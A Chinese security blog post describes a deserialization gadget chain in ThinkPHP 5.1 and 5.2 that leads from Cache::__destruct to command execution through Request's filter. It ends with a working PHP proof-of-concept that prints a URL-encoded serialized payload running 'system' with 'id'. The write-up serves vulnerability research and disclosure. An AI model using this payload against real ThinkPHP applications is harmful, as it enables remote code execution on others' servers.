# ThinkPHP 5.x 另一条反序列化利用链

阅读量 **999397**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-11-09 11:00:41

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01f94b513bc1c3f4c4.jpg)

前几天整体看完Laravel的POP链，顺便想看看Thinkphp的POP链，也有很多师傅都已经分析过了5.x和6.x的反序列化利用链。复现了一个5.1的POP链后，自己尝试挖掘了一下5.2的POP链，发现了一条对于5.1和5.2是通杀的POP链，并且和师傅们找的都不大相同，就把思路分享出来。

分析完了Laravel的，不得不说ThinkPHP可利用的初始类是真的少，`__destruct`和`__wakeup`也就那么几个，师傅们大多都是利用`thinkprocesspipesWindows`类的`__destruct`，后续再利用`__toString`继续寻找利用链。

## POP链分析

我一开始就换了个初始类，最后在`thinkCache`找到了些苗头，利用它的`__destruct`函数。

![](https://p0.ssl.qhimg.com/t016b02f74645cc981c.png)

跟进commit函数，`$this->deferred`是可控的，save函数参数也就是可控的。

![](https://p2.ssl.qhimg.com/t01aa8e25657883cdbf.png)

再跟进save函数，`$item`完全可控，它必须是一个`CacheItemInterface`对象。

![](https://p4.ssl.qhimg.com/t011c7afd545cba0a5f.png)

找到`thinkcacheCacheItem`类，发现`$item->getKey()`, `$item->get()`,
`$item->getExpire()`都是可控的。

![](https://p0.ssl.qhimg.com/t014b81b9fa421dfb3e.png)

![](https://p0.ssl.qhimg.com/t0107b953ca091f084d.png)

![](https://p4.ssl.qhimg.com/t0119e3f5ee93b9c042.png)

回到save函数，跟进set函数。

![](https://p4.ssl.qhimg.com/t01bd96a174232d31fc.png)

跟进init函数，可以看到，我们将`$this->handler`设置为任意对象他都会返回。

![](https://p2.ssl.qhimg.com/t0120bc896e51ae1824.png)

现在全局搜索含有`set`函数的类，在`thinkcachedriverMemcached`找到。

![](https://p1.ssl.qhimg.com/t01560b21d7924e3fb9.png)

跟进其中的has函数，我们看到`$this->handler`又是可控的，又可以返回任意对象。

![](https://p1.ssl.qhimg.com/t0137c0574d77c31580.png)

再全局搜索get函数，看到`think/Request`里面有，分析过最开始的5.1反序列化的POP链的人都知道，最后的RCE点就在这个类。get函数里有input函数，前两个参数完全可控。

![](https://p3.ssl.qhimg.com/t011d7a4f136f1b7bd5.png)

进入input函数，想要进入下面的filterData函数且满足第一个参数可控

![](https://p0.ssl.qhimg.com/t01235ef627eead50a1.png)

那么我们进入getData函数，我们知道`$data`和`$name`都是可控的，那么getData函数的返回也是可控的。

![](https://p4.ssl.qhimg.com/t011f54e6c6bef49e7f.png)

然后顺利进入filterData函数。

![](https://p2.ssl.qhimg.com/t016a438c8a5f0d8099.png)

因为getFilter函数中的`$this-filter`可控，所以getFilter函数也是可控的。

![](https://p5.ssl.qhimg.com/t01c3697f867705a75b.png)

最后进入filterValue函数，终于到了RCE的点了。

![](https://p0.ssl.qhimg.com/t01d8b205622e48e4df.png)

最后测试

![](https://p2.ssl.qhimg.com/t0177eaa2f03f90cd54.png)

    
    
    <?php
    namespace think{
        class Cache{
            protected $deferred;
            protected $handler;
            function __construct($Memcached, $CacheItem){
                $this->handler = $Memcached;
                $this->deferred = array('' => $CacheItem);
            }
    
        }
    }
    
    namespace thinkcache{
        class CacheItem{
            protected $key;
            protected $value;
            protected $expire;
    
            function __construct($name, $value){
                $this->key = $name;
                $this->value = $value;
                $this->expire = null;
    
            }
        }
    }
    
    namespace thinkcachedriver{
        class Memcached{
            protected $option;
            protected $handler;
            protected $tag = 1;
            protected $writeTimes = 0;
            function __construct($Request){
                $this->handler = $Request;
                $this->option = array('prefix'=>'');
            }
        }
    }
    
    namespace think{
        class Request
        {
            protected $filter;
            protected $get;
            protected $mergeParam;
            function __construct(){
                $this->filter = "system";
    
                $this->get = array("jrxnm"=>"id");
                $this->mergeParam = true;
            }
        }
    
    }
    
    namespace{
        $r = new thinkRequest();
        $c = new thinkcacheCacheItem('jrxnm', '');
        $m = new thinkcachedriverMemcached($r);
        $b = new thinkCache($m,$c);
        echo urlencode(serialize($b));
    }
    

## 总结

找POP链是一个很有意思的事情，那种一环扣一环、利用PHP各种特性最后RCE的POP链是最让人拍案叫绝的。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **JrXnm** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/189989](/post/id/189989)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [PHP](/tag/PHP)
  * [反序列化](/tag/反序列化)

 **+1** __10赞

 __收藏

![](https://p5.ssl.qhimg.com/t01aab9f062b9888337.png) JrXnm

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

